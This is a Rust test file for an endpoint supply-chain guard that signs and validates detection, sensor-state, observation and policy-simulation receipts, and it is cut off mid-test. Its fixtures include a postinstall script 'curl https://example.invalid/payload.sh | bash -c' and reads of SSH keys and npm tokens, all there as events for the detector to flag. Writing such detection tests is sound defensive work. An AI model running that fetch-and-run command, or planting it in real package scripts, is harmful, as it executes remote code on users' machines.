#[test]
fn endpoint_decision_receipt_for_detection_signs_and_verifies() {
    let guard = SupplyChainRuntimeGuard::new();
    let event = observation(EndpointEvent::PackageScript {
        manager: PackageManager::Npm,
        package: Some("leftpad-plus".to_string()),
        phase: "postinstall".to_string(),
        script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
        working_directory: Some("/tmp/pkg".to_string()),
    });
    let finding = guard.evaluate(&event).into_iter().next().unwrap();
    let mut graph_recorder = CausalGraphRecorder::new();
    graph_recorder.record_observation(&event);
    let keypair = hush_core::Keypair::from_seed(&[7u8; 32]);

    let mut receipt = valid_detection_receipt(
        1,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

    let signed = receipt.sign_with(&keypair).unwrap();
    let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

    assert!(verification.valid);
    assert_eq!(signed.receipt.receipt_id, Some(receipt.receipt_id()));
    assert!(!signed.receipt.verdict.passed);
    assert_eq!(
        signed.receipt.verdict.gate_id.as_deref(),
        Some("supply_chain.install_script.risky")
    );
    assert!(signed
        .receipt
        .metadata
        .as_ref()
        .and_then(|metadata| metadata.get("endpointDecision"))
        .and_then(|metadata| metadata.get("decision"))
        .and_then(|decision| decision.get("findingId"))
        .and_then(serde_json::Value::as_str)
        .is_some_and(|value| value == finding.finding_id));
    assert!(receipt.evidence.iter().all(|item| item.raw_value.is_none()
        && item.redaction_class == EndpointEvidenceRedactionClass::HashOnly
        && item.value_hash.starts_with("0x")));
    assert!(receipt.graph.process_node_id.is_some());
    assert!(!receipt.graph.edge_ids.is_empty());
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "detectionFindingId"));
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "detectionGraphSliceId"));

    let mut receipt_value = serde_json::to_value(&receipt)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint receipt: {err}"));
    receipt_value["unsignedExtra"] = serde_json::Value::String("must not be ignored".into());
    let err = serde_json::from_value::<EndpointDecisionReceipt>(receipt_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("unsignedExtra"),
        "expected unknown endpoint receipt field to be rejected, got {err}"
    );

    let mut clock_value = serde_json::to_value(&receipt.clock)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint clock: {err}"));
    clock_value["shadowUncertaintyMs"] = serde_json::Value::Number(7.into());
    let err = serde_json::from_value::<EndpointClockState>(clock_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowUncertaintyMs"),
        "expected unknown endpoint clock field to be rejected, got {err}"
    );

    let mut actor_value = serde_json::to_value(&receipt.actor)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint actor: {err}"));
    actor_value["shadowSessionId"] = serde_json::Value::String("must not be ignored".into());
    let err = serde_json::from_value::<EndpointDecisionActor>(actor_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowSessionId"),
        "expected unknown endpoint actor field to be rejected, got {err}"
    );

    let mut decision_value = serde_json::to_value(&receipt.decision)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint decision: {err}"));
    decision_value["shadowAction"] = serde_json::Value::String("allow".into());
    let err = serde_json::from_value::<EndpointDecisionRecord>(decision_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowAction"),
        "expected unknown endpoint decision field to be rejected, got {err}"
    );

    let mut policy_value = serde_json::to_value(&receipt.policy)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint policy: {err}"));
    policy_value["shadowPolicyEpoch"] = serde_json::Value::Number(8.into());
    let err = serde_json::from_value::<EndpointPolicySnapshot>(policy_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowPolicyEpoch"),
        "expected unknown endpoint policy field to be rejected, got {err}"
    );

    let mut signer_value = serde_json::to_value(&receipt.signer)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint signer: {err}"));
    signer_value["shadowSignerPublicKey"] = serde_json::Value::String("must not be ignored".into());
    let err = serde_json::from_value::<EndpointReceiptSigner>(signer_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowSignerPublicKey"),
        "expected unknown endpoint signer field to be rejected, got {err}"
    );

    let mut graph_value = serde_json::to_value(&receipt.graph)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint graph reference: {err}"));
    graph_value["shadowGraphSliceId"] = serde_json::Value::String("must not be ignored".into());
    let err = serde_json::from_value::<EndpointGraphReference>(graph_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowGraphSliceId"),
        "expected unknown endpoint graph reference field to be rejected, got {err}"
    );

    let mut sensor_state_value = serde_json::to_value(&receipt.sensor_state)
        .unwrap_or_else(|err| panic!("failed to serialize endpoint sensor state: {err}"));
    sensor_state_value["shadowProviderCount"] = serde_json::Value::Number(1.into());
    let err = serde_json::from_value::<EndpointSensorState>(sensor_state_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowProviderCount"),
        "expected unknown endpoint sensor state field to be rejected, got {err}"
    );

    let mut provider_state_value = serde_json::to_value(&receipt.sensor_state.providers[0])
        .unwrap_or_else(|err| panic!("failed to serialize endpoint provider state: {err}"));
    provider_state_value["shadowRuntimeStatus"] =
        serde_json::Value::String("must not be ignored".into());
    let err = serde_json::from_value::<EndpointProviderState>(provider_state_value)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("unknown field") && err.contains("shadowRuntimeStatus"),
        "expected unknown endpoint provider state field to be rejected, got {err}"
    );

    let mut mismatched_finding_id = receipt.clone();
    if let Some(finding_id_evidence) = mismatched_finding_id
        .evidence
        .iter_mut()
        .find(|item| item.key == "detectionFindingId")
    {
        *finding_id_evidence =
            EndpointReceiptEvidence::hashed("detectionFindingId", "finding:other");
    }
    assert!(mismatched_finding_id
        .validate()
        .unwrap_err()
        .to_string()
        .contains("detection finding id evidence hash"));

    let mut relabeled_finding_id = receipt.clone();
    relabeled_finding_id.decision.finding_id = Some("finding:other".to_string());
    if let Some(finding_id_evidence) = relabeled_finding_id
        .evidence
        .iter_mut()
        .find(|item| item.key == "detectionFindingId")
    {
        *finding_id_evidence =
            EndpointReceiptEvidence::hashed("detectionFindingId", "finding:other");
    }
    assert!(relabeled_finding_id
        .validate()
        .unwrap_err()
        .to_string()
        .contains("detection finding id"));

    let mut missing_graph_slice = receipt.clone();
    missing_graph_slice
        .evidence
        .retain(|item| item.key != "detectionGraphSliceId");
    assert!(missing_graph_slice
        .validate()
        .unwrap_err()
        .to_string()
        .contains("detection graph slice evidence"));

    let mut mismatched_process_reference = receipt.clone();
    mismatched_process_reference.graph.process_node_id = Some("node:other".to_string());
    if let Some(process_node_evidence) = mismatched_process_reference
        .evidence
        .iter_mut()
        .find(|item| item.key == "detectionProcessNodeId")
    {
        *process_node_evidence =
            EndpointReceiptEvidence::hashed("detectionProcessNodeId", "node:other");
    }
    assert!(mismatched_process_reference
        .validate()
        .unwrap_err()
        .to_string()
        .contains("detection process node reference"));

    let mut mismatched_graph_slice_reference = receipt.clone();
    mismatched_graph_slice_reference.graph.graph_slice_id = Some("graph_slice:other".to_string());
    if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
        .evidence
        .iter_mut()
        .find(|item| item.key == "detectionGraphSliceId")
    {
        *graph_slice_evidence =
            EndpointReceiptEvidence::hashed("detectionGraphSliceId", "graph_slice:other");
    }
    assert!(mismatched_graph_slice_reference
        .validate()
        .unwrap_err()
        .to_string()
        .contains("detection graph slice reference"));
}

#[test]
fn endpoint_decision_receipt_rejects_missing_required_evidence_boundaries() {
    let guard = SupplyChainRuntimeGuard::new();
    let event = observation(EndpointEvent::CredentialAccess {
        kind: CredentialKind::PackageRegistryToken,
        path: Some("/Users/alice/.npmrc".to_string()),
        name: None,
    });
    let finding = guard.evaluate(&event).into_iter().next().unwrap();
    let mut graph_recorder = CausalGraphRecorder::new();
    graph_recorder.record_observation(&event);
    let valid = valid_detection_receipt(
        8,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );

    let mut missing_policy_hash = valid.clone();
    missing_policy_hash.policy.policy_hash.clear();
    assert!(missing_policy_hash
        .validate()
        .unwrap_err()
        .to_string()
        .contains("policy hash"));

    let mut missing_policy_epoch = valid.clone();
    missing_policy_epoch.policy.policy_epoch = 0;
    assert!(missing_policy_epoch
        .validate()
        .unwrap_err()
        .to_string()
        .contains("policy epoch"));

    let mut missing_sensor_state = valid.clone();
    missing_sensor_state.sensor_state.providers.clear();
    assert!(missing_sensor_state
        .validate()
        .unwrap_err()
        .to_string()
        .contains("sensor state"));

    let mut missing_signer = valid;
    missing_signer.signer.signer_identity.clear();
    assert!(missing_signer
        .validate()
        .unwrap_err()
        .to_string()
        .contains("signer identity"));

    let mut missing_confidence = valid_detection_receipt(
        9,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    missing_confidence.decision.confidence = None;
    assert!(missing_confidence
        .validate()
        .unwrap_err()
        .to_string()
        .contains("confidence"));

    let mut missing_evidence = valid_detection_receipt(
        10,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    missing_evidence.evidence.clear();
    assert!(missing_evidence
        .validate()
        .unwrap_err()
        .to_string()
        .contains("evidence"));

    let mut blank_evidence_key = valid_detection_receipt(
        11,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    blank_evidence_key.evidence[0].key.clear();
    assert!(blank_evidence_key
        .validate()
        .unwrap_err()
        .to_string()
        .contains("evidence key"));

    let mut malformed_evidence_hash = valid_detection_receipt(
        12,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    malformed_evidence_hash.evidence[0].value_hash = "not-a-hash".to_string();
    assert!(malformed_evidence_hash
        .validate()
        .unwrap_err()
        .to_string()
        .contains("evidence value hash"));

    let mut duplicate_evidence_key = valid_detection_receipt(
        13,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    duplicate_evidence_key.evidence[1].key = duplicate_evidence_key.evidence[0].key.clone();
    assert!(duplicate_evidence_key
        .validate()
        .unwrap_err()
        .to_string()
        .contains("duplicate evidence key"));
}

#[test]
fn endpoint_decision_receipt_rejects_signer_public_key_mismatch() {
    let guard = SupplyChainRuntimeGuard::new();
    let mut event = observation(EndpointEvent::ProcessExec {
        image: "/Users/alice/Downloads/build-helper".to_string(),
        args: vec!["--postinstall".to_string()],
        env: BTreeMap::new(),
    });
    event.process.signing = CodeSignatureStatus {
        trust: SignatureTrust::Unsigned,
        notarized: Some(false),
        ..CodeSignatureStatus::default()
    };
    let finding = guard.evaluate(&event).into_iter().next().unwrap();
    let mut graph_recorder = CausalGraphRecorder::new();
    graph_recorder.record_observation(&event);
    let keypair = hush_core::Keypair::from_seed(&[9u8; 32]);
    let other = hush_core::Keypair::from_seed(&[10u8; 32]);
    let mut receipt = valid_detection_receipt(
        9,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );
    receipt.signer.signer_public_key = Some(other.public_key().to_hex());

    let err = receipt.sign_with(&keypair).unwrap_err();

    assert!(err.to_string().contains("public key"));
}

#[test]
fn endpoint_decision_receipt_signing_embeds_signer_public_key_when_missing() {
    let guard = SupplyChainRuntimeGuard::new();
    let event = observation(EndpointEvent::PackageScript {
        manager: PackageManager::Npm,
        package: Some("leftpad-plus".to_string()),
        phase: "postinstall".to_string(),
        script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
        working_directory: Some("/tmp/pkg".to_string()),
    });
    let finding = guard.evaluate(&event).into_iter().next().unwrap();
    let mut graph_recorder = CausalGraphRecorder::new();
    graph_recorder.record_observation(&event);
    let keypair = hush_core::Keypair::from_seed(&[12u8; 32]);
    let receipt = valid_detection_receipt(
        13,
        "endpoint-1",
        "local-agent:endpoint-1",
        &event,
        &finding,
        graph_recorder.graph(),
    );

    let signed = receipt.sign_with(&keypair).unwrap();
    let signer_public_key = signed
        .receipt
        .metadata
        .as_ref()
        .and_then(|metadata| metadata.get("endpointDecision"))
        .and_then(|endpoint| endpoint.get("signer"))
        .and_then(|signer| signer.get("signerPublicKey"))
        .and_then(serde_json::Value::as_str);

    assert_eq!(
        signer_public_key,
        Some(keypair.public_key().to_hex().as_str())
    );
}

#[test]
fn endpoint_sensor_state_receipt_binds_provider_health() {
    let keypair = hush_core::Keypair::from_seed(&[14u8; 32]);
    let sensor_state = EndpointSensorState {
        providers: vec![
            EndpointProviderState {
                provider_id: "agent-api".to_string(),
                provider_kind: EndpointProviderKind::AgentApi,
                installed: true,
                active: true,
                healthy: true,
                degraded: false,
                degradation_reasons: Vec::new(),
                dropped_event_count: 0,
                deadline_miss_count: 0,
                full_disk_access: None,
                last_seen: Some(Utc::now()),
            },
            EndpointProviderState {
                provider_id: "macos.endpoint_security".to_string(),
                provider_kind: EndpointProviderKind::EndpointSecurity,
                installed: true,
                active: false,
                healthy: false,
                degraded: true,
                degradation_reasons: vec!["missing full disk access".to_string()],
                dropped_event_count: 2,
                deadline_miss_count: 1,
                full_disk_access: Some(false),
                last_seen: None,
            },
        ],
    };
    let mut receipt = EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
        local_sequence: 13,
        endpoint_id: "endpoint-1",
        signer_identity: "local-edr:endpoint-1",
        policy: EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        },
        sensor_state,
        reason: "prove protection state",
    });
    receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

    let signed = receipt.sign_with(&keypair).unwrap();
    let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

    assert!(verification.valid);
    assert_eq!(
        receipt.receipt_family,
        EndpointDecisionReceiptFamily::SensorState
    );
    assert!(!receipt.decision.passed);
    assert_eq!(
        receipt.decision.rule_id.as_deref(),
        Some("endpoint.sensor_state")
    );
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "degradedProviderCount"));
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "sensorStateHash"));

    let mut mismatched_provider_count = receipt.clone();
    if let Some(provider_count_evidence) = mismatched_provider_count
        .evidence
        .iter_mut()
        .find(|item| item.key == "providerCount")
    {
        *provider_count_evidence = EndpointReceiptEvidence::hashed("providerCount", "1");
    }
    assert!(mismatched_provider_count
        .validate()
        .unwrap_err()
        .to_string()
        .contains("sensor state provider count evidence hash"));

    let mut mismatched_provider_ids = receipt.clone();
    if let Some(provider_ids_evidence) = mismatched_provider_ids
        .evidence
        .iter_mut()
        .find(|item| item.key == "providerIds")
    {
        *provider_ids_evidence = EndpointReceiptEvidence::hashed("providerIds", "agent-api");
    }
    assert!(mismatched_provider_ids
        .validate()
        .unwrap_err()
        .to_string()
        .contains("sensor state provider ids evidence hash"));

    let mut relabeled_provider_ids = receipt.clone();
    relabeled_provider_ids.sensor_state.providers[1].provider_id =
        "macos.endpoint_security.relabel".to_string();
    if let Some(provider_ids_evidence) = relabeled_provider_ids
        .evidence
        .iter_mut()
        .find(|item| item.key == "providerIds")
    {
        *provider_ids_evidence = EndpointReceiptEvidence::hashed(
            "providerIds",
            "agent-api,macos.endpoint_security.relabel",
        );
    }
    assert!(relabeled_provider_ids
        .validate()
        .unwrap_err()
        .to_string()
        .contains("sensor state id"));

    let mut relabeled_active_count = receipt.clone();
    relabeled_active_count.sensor_state.providers[1].active = true;
    relabeled_active_count.sensor_state.providers[1].last_seen = Some(receipt.clock.captured_at);
    if let Some(active_count_evidence) = relabeled_active_count
        .evidence
        .iter_mut()
        .find(|item| item.key == "activeProviderCount")
    {
        *active_count_evidence = EndpointReceiptEvidence::hashed("activeProviderCount", "2");
    }
    assert!(relabeled_active_count
        .validate()
        .unwrap_err()
        .to_string()
        .contains("sensor state id"));

    let mut relabeled_sensor_state_hash = receipt.clone();
    relabeled_sensor_state_hash.sensor_state.providers[1].degradation_reasons =
        vec!["network extension offline".to_string()];
    let sensor_state_value = serde_json::to_value(&relabeled_sensor_state_hash.sensor_state)
        .unwrap_or_else(|err| panic!("failed to serialize relabeled sensor state: {err}"));
    let canonical_sensor_state = canonicalize_json(&sensor_state_value)
        .unwrap_or_else(|err| panic!("failed to canonicalize relabeled sensor state: {err}"));
    let sensor_state_hash = sha256(canonical_sensor_state.as_bytes()).to_hex_prefixed();
    if let Some(sensor_state_hash_evidence) = relabeled_sensor_state_hash
        .evidence
        .iter_mut()
        .find(|item| item.key == "sensorStateHash")
    {
        *sensor_state_hash_evidence =
            EndpointReceiptEvidence::hashed("sensorStateHash", sensor_state_hash);
    }
    assert!(relabeled_sensor_state_hash
        .validate()
        .unwrap_err()
        .to_string()
        .contains("sensor state id"));

    let mut unmarked_degraded_provider = receipt.clone();
    unmarked_degraded_provider.sensor_state.providers[1].degraded = false;
    assert!(unmarked_degraded_provider
        .validate()
        .unwrap_err()
        .to_string()
        .contains("marked degraded"));

    let mut missing_active_last_seen = receipt.clone();
    missing_active_last_seen.sensor_state.providers[0].last_seen = None;
    assert!(missing_active_last_seen
        .validate()
        .unwrap_err()
        .to_string()
        .contains("last seen"));

    let mut future_active_last_seen = receipt.clone();
    future_active_last_seen.sensor_state.providers[0].last_seen =
        Some(receipt.clock.captured_at + chrono::Duration::seconds(5));
    assert!(future_active_last_seen
        .validate()
        .unwrap_err()
        .to_string()
        .contains("after receipt capture"));

    let mut missing_degraded_reason = receipt.clone();
    missing_degraded_reason.sensor_state.providers[1]
        .degradation_reasons
        .clear();
    assert!(missing_degraded_reason
        .validate()
        .unwrap_err()
        .to_string()
        .contains("degradation reason"));

    let mut blank_degraded_reason = receipt;
    blank_degraded_reason.sensor_state.providers[1].degradation_reasons = vec!["  ".to_string()];
    assert!(blank_degraded_reason
        .validate()
        .unwrap_err()
        .to_string()
        .contains("degradation reason"));
}

#[test]
fn endpoint_sensor_state_receipt_rejects_duplicate_provider_ids() {
    let provider = EndpointProviderState {
        provider_id: "agent-api".to_string(),
        provider_kind: EndpointProviderKind::AgentApi,
        installed: true,
        active: true,
        healthy: true,
        degraded: false,
        degradation_reasons: Vec::new(),
        dropped_event_count: 0,
        deadline_miss_count: 0,
        full_disk_access: None,
        last_seen: Some(Utc::now()),
    };
    let mut receipt = EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
        local_sequence: 16,
        endpoint_id: "endpoint-1",
        signer_identity: "local-edr:endpoint-1",
        policy: EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        },
        sensor_state: EndpointSensorState {
            providers: vec![provider.clone(), provider],
        },
        reason: "prove protection state",
    });
    receipt.signer.signer_public_key = Some(
        hush_core::Keypair::from_seed(&[16u8; 32])
            .public_key()
            .to_hex(),
    );

    assert!(receipt
        .validate()
        .unwrap_err()
        .to_string()
        .contains("duplicate sensor provider id"));
}

#[test]
fn endpoint_provider_degradation_receipt_requires_degraded_provider() {
    let keypair = hush_core::Keypair::from_seed(&[15u8; 32]);
    let provider = EndpointProviderState {
        provider_id: "macos.endpoint_security".to_string(),
        provider_kind: EndpointProviderKind::EndpointSecurity,
        installed: true,
        active: false,
        healthy: false,
        degraded: true,
        degradation_reasons: vec!["missing_full_disk_access".to_string()],
        dropped_event_count: 3,
        deadline_miss_count: 2,
        full_disk_access: Some(false),
        last_seen: Some(Utc::now()),
    };
    let sensor_state = EndpointSensorState {
        providers: vec![provider.clone()],
    };
    let mut receipt = EndpointDecisionReceipt::for_provider_degradation(
        EndpointProviderDegradationReceiptInput {
            local_sequence: 14,
            endpoint_id: "endpoint-1",
            signer_identity: "local-edr:endpoint-1",
            policy: EndpointPolicySnapshot {
                policy_version: "test-policy@1".to_string(),
                policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                policy_epoch: 7,
            },
            sensor_state,
            provider: &provider,
        },
    );
    receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

    let signed = receipt.sign_with(&keypair).unwrap();
    let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

    assert!(verification.valid);
    assert_eq!(
        receipt.receipt_family,
        EndpointDecisionReceiptFamily::ProviderDegradation
    );
    assert!(!receipt.decision.passed);
    assert!(receipt
        .decision
        .rule_id
        .as_deref()
        .unwrap_or_default()
        .contains("macos.endpoint_security"));
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "degradationReasons"));
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "fullDiskAccess"));

    let mut mismatched_provider_id = receipt.clone();
    if let Some(provider_id_evidence) = mismatched_provider_id
        .evidence
        .iter_mut()
        .find(|item| item.key == "providerId")
    {
        *provider_id_evidence = EndpointReceiptEvidence::hashed("providerId", "agent-api");
    }
    assert!(mismatched_provider_id
        .validate()
        .unwrap_err()
        .to_string()
        .contains("provider degradation provider id evidence hash"));

    let mut missing_degradation_reasons = receipt.clone();
    missing_degradation_reasons
        .evidence
        .retain(|item| item.key != "degradationReasons");
    assert!(missing_degradation_reasons
        .validate()
        .unwrap_err()
        .to_string()
        .contains("provider degradation reasons evidence"));

    let mut mismatched_full_disk_access = receipt.clone();
    if let Some(full_disk_access_evidence) = mismatched_full_disk_access
        .evidence
        .iter_mut()
        .find(|item| item.key == "fullDiskAccess")
    {
        *full_disk_access_evidence = EndpointReceiptEvidence::hashed("fullDiskAccess", "true");
    }
    assert!(mismatched_full_disk_access
        .validate()
        .unwrap_err()
        .to_string()
        .contains("provider degradation full-disk-access evidence hash"));

    let mut relabeled_degradation_id = receipt.clone();
    relabeled_degradation_id.decision.finding_id = Some("provider_degradation:other".to_string());
    assert!(relabeled_degradation_id
        .validate()
        .unwrap_err()
        .to_string()
        .contains("provider degradation id"));

    let mut no_degraded_provider = receipt;
    let receipt_captured_at = no_degraded_provider.clock.captured_at;
    no_degraded_provider.sensor_state.providers[0] = EndpointProviderState {
        provider_id: "agent-api".to_string(),
        provider_kind: EndpointProviderKind::AgentApi,
        installed: true,
        active: true,
        healthy: true,
        degraded: false,
        degradation_reasons: Vec::new(),
        dropped_event_count: 0,
        deadline_miss_count: 0,
        full_disk_access: None,
        last_seen: Some(receipt_captured_at),
    };
    assert!(no_degraded_provider
        .validate()
        .unwrap_err()
        .to_string()
        .contains("degraded provider"));
}

#[test]
fn endpoint_observation_receipt_binds_provider_graph_and_content_hash() {
    let keypair = hush_core::Keypair::from_seed(&[17u8; 32]);
    let observation = observation(EndpointEvent::FileAccess {
        operation: FileOperation::Read,
        path: "/Users/alice/.ssh/id_ed25519".to_string(),
        source_url: None,
        content_preview: None,
    });
    let mut recorder = CausalGraphRecorder::new();
    recorder.record_observation(&observation);
    let graph = recorder.into_graph();
    let sensor_state = EndpointSensorState {
        providers: vec![EndpointProviderState {
            provider_id: "macos.endpoint_security".to_string(),
            provider_kind: EndpointProviderKind::EndpointSecurity,
            installed: true,
            active: true,
            healthy: true,
            degraded: false,
            degradation_reasons: Vec::new(),
            dropped_event_count: 0,
            deadline_miss_count: 0,
            full_disk_access: Some(true),
            last_seen: Some(observation.timestamp),
        }],
    };
    let mut receipt = EndpointDecisionReceipt::for_observation(EndpointObservationReceiptInput {
        local_sequence: 15,
        endpoint_id: "endpoint-1",
        signer_identity: "local-edr:endpoint-1",
        policy: EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        },
        sensor_state,
        observation: &observation,
        graph: &graph,
    });
    receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

    let signed = receipt.sign_with(&keypair).unwrap();
    let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

    assert!(verification.valid);
    assert_eq!(
        receipt.receipt_family,
        EndpointDecisionReceiptFamily::Observation
    );
    assert_eq!(
        receipt.decision.observation_id.as_deref(),
        Some(observation.observation_id.as_str())
    );
    assert_eq!(
        receipt.decision.rule_id.as_deref(),
        Some("endpoint.observation.file_access")
    );
    assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
    assert_eq!(
        receipt.sensor_state.providers[0].provider_id,
        "macos.endpoint_security"
    );
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "observationHash"));

    let mut mismatched_observation_hash = receipt.clone();
    if let Some(observation_hash) = mismatched_observation_hash
        .evidence
        .iter_mut()
        .find(|item| item.key == "observationHash")
    {
        *observation_hash = EndpointReceiptEvidence::hashed("observationHash", "sha256:other");
    }
    assert!(mismatched_observation_hash
        .validate()
        .unwrap_err()
        .to_string()
        .contains("observation receipt id"));

    let mut mismatched_provider_kind = receipt.clone();
    if let Some(provider_kind) = mismatched_provider_kind
        .evidence
        .iter_mut()
        .find(|item| item.key == "providerKind")
    {
        *provider_kind = EndpointReceiptEvidence::hashed("providerKind", "network_extension");
    }
    assert!(mismatched_provider_kind
        .validate()
        .unwrap_err()
        .to_string()
        .contains("provider kind evidence"));

    let mut wrong_action = receipt;
    wrong_action.decision.action = EndpointDecisionAction::Alert;
    assert!(wrong_action
        .validate()
        .unwrap_err()
        .to_string()
        .contains("action must be observe"));
}

#[test]
fn endpoint_policy_simulation_scores_graph_breakage_and_signs_receipt() {
    let script_event = observation(EndpointEvent::PackageScript {
        manager: PackageManager::Npm,
        package: Some("left-pad".to_string()),
        phase: "postinstall".to_string(),
        script: "node ./postinstall.js".to_string(),
        working_directory: Some("/repo".to_string()),
    });
    let credential_event = EndpointObservation {
        observation_id: stable_id("test", ["obs", "credential-sim"]),
        event: EndpointEvent::CredentialAccess {
            kind: CredentialKind::PackageRegistryToken,
            path: Some("/Users/alice/.npmrc".to_string()),
            name: Some("npm-token".to_string()),
        },
        ..observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::PackageRegistryToken,
            path: Some("/Users/alice/.npmrc".to_string()),
            name: Some("npm-token".to_string()),
        })
    };
    let mut tool_event = observation(EndpointEvent::ToolCall {
        tool_name: "mcp.shell".to_string(),
        parameters: serde_json::json!({
            "command": "npm install"
        }),
    });
    tool_event.metadata.insert(
        "toolCallId".to_string(),
        serde_json::json!("tool-call-sim-1"),
    );
    let mut graph_recorder = CausalGraphRecorder::new();
    graph_recorder.record_observation(&script_event);
    graph_recorder.record_observation(&credential_event);
    graph_recorder.record_observation(&tool_event);
    let process_node_id = script_event.process.stable_node_id();
    let subgraph = graph_recorder
        .graph()
        .causal_subgraph_from(&process_node_id, 8)
        .unwrap();
    let simulation = EndpointPolicySimulationReport::for_rule(
        EndpointPolicySimulationRule {
            rule_id: "endpoint.policy.simulate.block_npm".to_string(),
            action: EndpointDecisionAction::Block,
            description: Some("block npm postinstall".to_string()),
        },
        &process_node_id,
        &subgraph,
    );

    assert!(simulation.would_block);
    assert!(simulation.developer_breakage_score >= 70);
    assert_eq!(simulation.affected_process_count, 1);
    assert!(simulation.affected_credential_count >= 1);
    assert!(simulation
        .affected_nodes
        .iter()
        .any(|node| node.kind == CausalNodeKind::PackageScript));
    assert!(simulation
        .affected_identities
        .iter()
        .any(|identity| identity.identity_kind == "user" && identity.value == "alice"));
    assert!(simulation
        .affected_identities
        .iter()
        .any(|identity| identity.identity_kind == "session" && identity.value == "session-1"));
    assert!(simulation.affected_tools.iter().any(|tool| {
        tool.tool_name == "mcp.shell" && tool.tool_call_id.as_deref() == Some("tool-call-sim-1")
    }));
    assert_unknown_field_rejected::<EndpointPolicySimulationRule>(
        serde_json::to_value(EndpointPolicySimulationRule {
            rule_id: "endpoint.policy.simulate.block_npm".to_string(),
            action: EndpointDecisionAction::Block,
            description: Some("block npm postinstall".to_string()),
        })
        .unwrap(),
        "shadowRuleMode",
    );
    assert_unknown_field_rejected::<EndpointPolicySimulationReport>(
        serde_json::to_value(&simulation).unwrap(),
        "shadowWouldBreak",
    );
    assert_unknown_field_rejected::<EndpointPolicySimulationAffectedNode>(
        serde_json::to_value(&simulation.affected_nodes[0]).unwrap(),
        "shadowBreakageReason",
    );
    assert_unknown_field_rejected::<EndpointPolicySimulationIdentityContext>(
        serde_json::to_value(&simulation.affected_identities[0]).unwrap(),
        "shadowIdentityValue",
    );
    assert_unknown_field_rejected::<EndpointPolicySimulationToolContext>(
        serde_json::to_value(&simulation.affected_tools[0]).unwrap(),
        "shadowToolCall",
    );

    let keypair = hush_core::Keypair::from_seed(&[12u8; 32]);
    let mut receipt = EndpointDecisionReceipt::for_simulation(EndpointSimulationReceiptInput {
        local_sequence: 11,
        endpoint_id: "endpoint-1",
        signer_identity: "local-edr:endpoint-1",
        policy: EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        },
        sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
        simulation: &simulation,
        graph: &subgraph,
    });
    receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

    let signed = receipt.sign_with(&keypair).unwrap();
    let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

    assert!(verification.valid);
    assert_eq!(
        receipt.receipt_family,
        EndpointDecisionReceiptFamily::Simulation
    );
    assert_eq!(
        receipt.decision.finding_id.as_deref(),
        Some(simulation.simulation_id.as_str())
    );
    assert_eq!(
